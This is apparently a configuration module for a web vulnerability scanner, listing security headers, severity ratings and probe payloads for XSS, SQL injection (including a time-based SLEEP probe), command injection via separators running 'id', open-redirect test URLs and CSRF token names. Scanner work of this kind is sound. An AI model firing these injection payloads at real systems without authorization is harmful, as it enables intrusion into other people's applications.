SECURE_HEADERS = { 'content-security-policy': 'CSP',
                   'x-frame-options': 'X-Frame-Options',
                   'x-content-type-options': 'X-Content-Type-Options',
                   'strict-transport-security': 'HSTS',
                   'referrer-policy': 'Referrer-Policy' }

SEVERITY = {
    'missing_security_headers': 'Low-Medium',
    'insecure_cookie': 'Low-Medium',
    'xss': 'High',
    'sqli': 'High',
    'open_redirect': 'Medium',
    'cmd_injection': 'High',
'csrf_missing': 'Medium'
}


XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\" onerror=alert(1) src=1>",
    "'><svg onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
]

SQLI_PAYLOADS = [
    "' OR '1'='1' -- ",
    '" OR "1"="1" -- ',
    "') OR ('1'='1' -- ",
]

SQLI_TIME = [
    "' OR SLEEP(3)-- ",
]

CMD_INJECTION = [
    "; id", "&& id", "| id", "`id`", "$(id)"
]

OPEN_REDIRECT_TESTS = [
    'https://example.com/', 'http://evil.example/'
]

CSRF_TOKEN_NAMES = {
    'csrfmiddlewaretoken', 'csrf_token', 'authenticity_token', '_csrf',
    '__csrf_token', 'csrf', '_csrf_token', '__requestverificationtoken', 'token', 'csrfhash'
}